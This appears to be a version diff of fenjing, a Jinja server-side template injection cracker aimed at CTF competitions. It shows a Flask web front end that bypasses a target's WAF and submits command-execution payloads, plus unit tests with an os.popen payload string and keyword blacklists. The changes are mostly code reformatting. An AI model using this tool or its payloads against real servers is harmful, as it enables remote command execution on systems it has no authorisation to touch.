             f"分析完毕，已为类型{data['gen_type']}生成payload {payload}"
         )
         if not data["will_print"]:
-            self.messages.append(
-                f"payload将不会产生回显"
-            )
+            self.messages.append(f"payload将不会产生回显")
 
     def callback_generate_payload(self, data):
-        payload_repr = data['payload']
+        payload_repr = data["payload"]
         if len(payload_repr) > 100:
             payload_repr = payload_repr[:100] + "..."
         self.flash_messages.append(
             "请求{req}对应的payload可以是{payload}".format(
                 req=f"{data['gen_type']}({', '.join(repr(arg) for arg in data['args'])})",
-                payload=payload_repr
+                payload=payload_repr,
             )
         )
 
     def callback_submit(self, data):
         self.flash_messages.append(
             f"提交表单完成，返回值为{data['response'].status_code}，输入为{data['inputs']}，表单为{data['form']}"
         )
 
     def callback_test_form_input(self, data):
         if not data["ok"]:
             return
-        testsuccess_msg = "payload测试成功！" if data["test_success"] else "payload测试失败。"
-        will_print_msg = "其会产生回显。" if data["will_print"] else "其不会产生回显。"
-        self.messages.append(
-            testsuccess_msg + will_print_msg
+        testsuccess_msg = (
+            "payload测试成功！" if data["test_success"] else "payload测试失败。"
         )
+        will_print_msg = "其会产生回显。" if data["will_print"] else "其不会产生回显。"
+        self.messages.append(testsuccess_msg + will_print_msg)
 
     def __call__(self, callback_type, data):
         def default_handler(data):
             return logger.warning(f"callback_type={callback_type} not found")
+
         return {
             CALLBACK_PREPARE_FULLPAYLOADGEN: self.callback_prepare_fullpayloadgen,
             CALLBACK_GENERATE_FULLPAYLOAD: self.callback_generate_fullpayload,
             CALLBACK_GENERATE_PAYLOAD: self.callback_generate_payload,
             CALLBACK_SUBMIT: self.callback_submit,
-            CALLBACK_TEST_FORM_INPUT: self.callback_test_form_input
+            CALLBACK_TEST_FORM_INPUT: self.callback_test_form_input,
         }.get(callback_type, default_handler)(data)
 
 
 class CrackTaskThread(threading.Thread):
     def __init__(self, taskid, url, form, interval):
         super().__init__()
         self.result = None
@@ -97,33 +105,27 @@
         self.messages = []
         self.callback = CallBackLogger(self.flash_messages, self.messages)
 
         self.cracker = FormCracker(
             url=url,
             form=form,
             requester=Requester(
-                interval=interval,
-                user_agent=DEFAULT_USER_AGENT
+                interval=interval, user_agent=DEFAULT_USER_AGENT
             ),
-            callback=self.callback
+            callback=self.callback,
         )
 
     def run(self):
-        self.messages.append(
-            f"开始分析WAF"
-        )
+        self.messages.append(f"开始分析WAF")
         self.result = self.cracker.crack()
         if self.result:
-            self.messages.append(
-                f"WAF已绕过，现在可以执行Shell指令了"
-            )
+            self.messages.append(f"WAF已绕过，现在可以执行Shell指令了")
         else:
-            self.messages.append(
-                f"WAF绕过失败"
-            )
+            self.messages.append(f"WAF绕过失败")
+
 
 class InteractiveTaskThread(threading.Thread):
     def __init__(self, taskid, cracker, field, full_payload_gen, cmd):
         super().__init__()
         self.taskid = taskid
         self.cracker = cracker
         self.field = field
@@ -134,153 +136,159 @@
         self.messages = []
         self.callback = CallBackLogger(self.flash_messages, self.messages)
 
         self.cracker.callback = self.callback
         self.full_payload_gen.callback = self.callback
 
     def run(self):
-        self.messages.append(
-            f"开始生成payload"
-        )
+        self.messages.append(f"开始生成payload")
         payload, will_print = self.full_payload_gen.generate(
-            OS_POPEN_READ,
-            self.cmd
+            OS_POPEN_READ, self.cmd
         )
         if not will_print:
-            self.messages.append(
-                f"此payload不会产生回显"
-            )
+            self.messages.append(f"此payload不会产生回显")
         r = self.cracker.submit({self.field: payload})
         assert r is not None
-        self.messages.append(
-            f"提交payload的回显如下："
-        )
+        self.messages.append(f"提交payload的回显如下：")
         self.messages.append(r.text)
 
 
 @app.route("/")
 def index():
     return render_template("index.html")
 
 
 def create_crack_task(url, method, inputs, action, interval):
     assert url != "" and inputs != "", "wrong param"
-    form = Form(
+    form = get_form(
         action=action or urlparse(url).path,
         method=method,
-        inputs=inputs.split(",")
+        inputs=inputs.split(","),
     )
     taskid = uuid.uuid4().hex
     task = CrackTaskThread(taskid, url, form, float(interval))
     task.daemon = True
     task.start()
     tasks[taskid] = task
     return taskid
 
 
 def create_interactive_id(cmd, last_task):
     assert cmd != "", "wrong param"
     cracker, field, full_payload_gen = (
         last_task.cracker,
         last_task.result.input_field,
-        last_task.result.full_payload_gen
+        last_task.result.full_payload_gen,
     )
     taskid = uuid.uuid4().hex
     task = InteractiveTaskThread(
-        taskid,
-        cracker,
-        field,
-        full_payload_gen,
-        cmd
+        taskid, cracker, field, full_payload_gen, cmd
     )
     task.daemon = True
     task.start()
     tasks[taskid] = task
     return taskid
 
 
-@app.route("/createTask", methods=["POST", ])  # type: ignore
+@app.route(
+    "/createTask",
+    methods=[
+        "POST",
+    ],
+)  # type: ignore
 def create_task():
     if request.form.get("type", None) not in ["crack", "interactive"]:
         logging.info(request.form)
-        return jsonify({
-            "code": APICODE_WRONG_INPUT,
-            "message": f"unknown type {request.form.get('type', None)}"
-        })
+        return jsonify(
+            {
+                "code": APICODE_WRONG_INPUT,
+                "message": f"unknown type {request.form.get('type', None)}",
+            }
+        )
     task_type = request.form.get("type", None)
     if task_type == "crack":
         taskid = create_crack_task(
             request.form["url"],
             request.form["method"],
             request.form["inputs"],
             request.form["action"],
             request.form["interval"],
         )
-        return jsonify({
-            "code": APICODE_OK,
-            "taskid": taskid
-        })
+        return jsonify({"code": APICODE_OK, "taskid": taskid})
     elif task_type == "interactive":
         cmd, last_task_id = (
             request.form["cmd"],
             request.form["last_task_id"],
         )
         if last_task_id not in tasks:
-            return jsonify({
-                "code": APICODE_WRONG_INPUT,
-                "message": f"last_task_id not found: {last_task_id}"
-            })
+            return jsonify(
+                {
+                    "code": APICODE_WRONG_INPUT,
+                    "message": f"last_task_id not found: {last_task_id}",
+                }
+            )
         last_task = tasks[last_task_id]
         if not isinstance(last_task, CrackTaskThread):
-            return jsonify({
-                "code": APICODE_WRONG_INPUT,
-                "message": f"last_task_id not found: {last_task_id}"
-            })
+            return jsonify(
+                {
+                    "code": APICODE_WRONG_INPUT,
+                    "message": f"last_task_id not found: {last_task_id}",
+                }
+            )
         if last_task.result is None:
-            return jsonify({
-                "code": APICODE_WRONG_INPUT,
-                "message": f"specified last_task failed: {last_task_id}"
-            })
+            return jsonify(
+                {
+                    "code": APICODE_WRONG_INPUT,
+                    "message": f"specified last_task failed: {last_task_id}",
+                }
+            )
         taskid = create_interactive_id(cmd, last_task)
-        return jsonify({
-            "code": APICODE_OK,
-            "taskid": taskid
-        })
+        return jsonify({"code": APICODE_OK, "taskid": taskid})
 
 
-@app.route("/watchTask", methods=["POST", ])  # type: ignore
+@app.route(
+    "/watchTask",
+    methods=[
+        "POST",
+    ],
+)  # type: ignore
 def watchTask():
     if "taskid" not in request.form:
-        return jsonify({
-            "code": APICODE_WRONG_INPUT,
-            "message": "taskid not provided"
-        })
+        return jsonify(
+            {"code": APICODE_WRONG_INPUT, "message": "taskid not provided"}
+        )
     if request.form["taskid"] not in tasks:
-        return jsonify({
-            "code": APICODE_WRONG_INPUT,
-            "message": f"task not found: {request.form['taskid']}"
-        })
+        return jsonify(
+            {
+                "code": APICODE_WRONG_INPUT,
+                "message": f"task not found: {request.form['taskid']}",
+            }
+        )
     task: CrackTaskThread = tasks[request.form["taskid"]]
     if isinstance(task, CrackTaskThread):
-        return jsonify({
-            "code": APICODE_OK,
-            "taskid": task.taskid,
-            "done": not task.is_alive(),
-            "messages": task.messages,
-            "flash_messages": task.flash_messages,
-            "success": task.result.input_field if task.result else None
-        })
+        return jsonify(
+            {
+                "code": APICODE_OK,
+                "taskid": task.taskid,
+                "done": not task.is_alive(),
+                "messages": task.messages,
+                "flash_messages": task.flash_messages,
+                "success": task.result.input_field if task.result else None,
+            }
+        )
     elif isinstance(task, InteractiveTaskThread):
-        return jsonify({
-            "code": APICODE_OK,
-            "taskid": task.taskid,
-            "done": not task.is_alive(),
-            "messages": task.messages,
-            "flash_messages": task.flash_messages,
-        })
+        return jsonify(
+            {
+                "code": APICODE_OK,
+                "taskid": task.taskid,
+                "done": not task.is_alive(),
+                "messages": task.messages,
+                "flash_messages": task.flash_messages,
+            }
+        )
 
 
 def main(host="127.0.0.1", port=11451):
     app.run(host=host, port=port)
 
 
 if __name__ == "__main__":
```

### Comparing `fenjing-0.4.2/fenjing.egg-info/PKG-INFO` & `fenjing-0.4.3/fenjing.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.2
+Version: 0.4.3
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.4.2/fenjing.egg-info/SOURCES.txt` & `fenjing-0.4.3/fenjing.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.2/setup.py` & `fenjing-0.4.3/setup.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.2/tests/test_payload_gen.py` & `fenjing-0.4.3/tests/test_payload_gen.py`

 * *Files 20% similar despite different names*

```diff
@@ -1,130 +1,147 @@
 import sys  # noqa
+
 sys.path.append("..")  # noqa
 
 import unittest
 import fenjing
 from fenjing.payload_gen import PayloadGenerator
 from fenjing import const
 import logging
 
 fenjing.payload_gen.logger.setLevel(logging.ERROR)
 logging.basicConfig(level=logging.INFO)
 
 
 def get_payload_gen(blacklist, context):
-    def waf_func(x): return all(
-        word not in x for word in blacklist
-    )
+    def waf_func(x):
+        return all(word not in x for word in blacklist)
+
     return PayloadGenerator(waf_func, context)
 
 
 class PayloadGenTestCaseSimple(unittest.TestCase):
-
     def setUp(self) -> None:
         super().setUp()
         self.payload_gen = get_payload_gen(
-            ["[", ],
-            {}
+            [
+                "[",
+            ],
+            {},
         )
 
     def test_string(self):
         strings = [
             "123",
             "asdf",
             "__dunder__",
-            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()"
+            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
         ]
         for string in strings:
-            self.assertIsNotNone(self.payload_gen.generate(
-                const.STRING, string
-            ))
+            self.assertIsNotNone(self.payload_gen.generate(const.STRING, string))
 
     def test_os_popen_read(self):
         self.assertIsNotNone(
-            self.payload_gen.generate(
-                const.OS_POPEN_READ, "echo fen  jing;"
-            )
+            self.payload_gen.generate(const.OS_POPEN_READ, "echo fen  jing;")
         )
 
 
 class PayloadGenTestCaseNoNumber(unittest.TestCase):
-
     def setUp(self) -> None:
         super().setUp()
         self.payload_gen = get_payload_gen(
             ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
             {
                 "l": 1,
                 "e": 3,
                 "lo": 10,
                 "loo": 100,
                 "eoo": 300,
-            }
+            },
         )
 
     def test_integers(self):
         for num in range(1, 128):
-            self.assertIsNotNone(
-                self.payload_gen.generate(
-                    const.INTEGER, num
-                )
-            )
+            self.assertIsNotNone(self.payload_gen.generate(const.INTEGER, num))
 
     def test_string(self):
         strings = [
             "123",
             "asdf",
             "__dunder__",
-            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()"
+            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
         ]
         for string in strings:
-            self.assertIsNotNone(self.payload_gen.generate(
-                const.STRING, string
-            ))
+            self.assertIsNotNone(self.payload_gen.generate(const.STRING, string))
 
     def test_os_popen_read(self):
         self.assertIsNotNone(
-            self.payload_gen.generate(
-                const.OS_POPEN_READ, "echo fen  jing;"
-            )
+            self.payload_gen.generate(const.OS_POPEN_READ, "echo fen  jing;")
         )
 
 
 class PayloadGenTestCaseHard(unittest.TestCase):
-
     def setUp(self) -> None:
         super().setUp()
         self.payload_gen = get_payload_gen(
             [
-                "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
-                "[", '"', "'", "_", ".", "+", "~", "{{",
-                "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
-                "０", "１", "２", "３", "４", "５", "６", "７", "８", "９"
+                "config",
+                "self",
+                "g",
+                "os",
+                "class",
+                "length",
+                "mro",
+                "base",
+                "lipsum",
+                "[",
+                '"',
+                "'",
+                "_",
+                ".",
+                "+",
+                "~",
+                "{{",
+                "0",
+                "1",
+                "2",
+                "3",
+                "4",
+                "5",
+                "6",
+                "7",
+                "8",
+                "9",
+                "０",
+                "１",
+                "２",
+                "３",
+                "４",
+                "５",
+                "６",
+                "７",
+                "８",
+                "９",
             ],
             {
                 "l": 1,
                 "e": 3,
                 "lo": 10,
                 "loo": 100,
                 "eoo": 300,
-            }
+            },
         )
 
     def test_string(self):
         strings = [
             "123",
             "asdf",
             "__dunder__",
-            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()"
+            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
         ]
         for string in strings:
-            self.assertIsNotNone(self.payload_gen.generate(
-                const.STRING, string
-            ))
+            self.assertIsNotNone(self.payload_gen.generate(const.STRING, string))
 
     def test_os_popen_read(self):
         self.assertIsNotNone(
-            self.payload_gen.generate(
-                const.OS_POPEN_READ, "echo fen  jing;"
-            )
+            self.payload_gen.generate(const.OS_POPEN_READ, "echo fen  jing;")
         )
```

